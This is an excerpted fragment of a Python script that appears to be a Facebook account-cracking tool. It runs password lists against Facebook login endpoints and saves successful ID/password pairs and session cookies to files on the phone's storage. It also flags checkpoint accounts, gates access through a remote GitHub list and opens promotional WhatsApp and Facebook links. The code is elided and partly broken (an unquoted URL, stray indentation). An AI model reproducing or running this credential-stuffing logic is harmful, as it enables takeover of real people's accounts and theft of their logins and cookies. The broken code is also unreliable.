...
echo "                                                            ";
  ...
  try:
    httpCaht = requests.get(https://github.com/CHUTTA1/FBt/blob/main/Active.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8804562?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	...
    	menu_apikey()
#menu_apikey()
os.system('xdg-open https://chat.whatsapp.com/BHqqv6M135wpW4Ql')
os.system('xdg-open https://www.facebook.com/maegeFB.im.silence.hacker')    
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [ FB-OK ] %s | %s'%(ids,pas))
                                open(f'/sdcard/FB-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ FB-CP ] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/FB-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [ FB-OK ] %s | %s'%(ids,pas))
                                open(f'/sdcard/FB-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [FB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/FB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  Joni, Siam, etc')
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[ JONI-OK ] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[ JONI-CP ] '+idf+' | '+ps+'\033[0;97m')
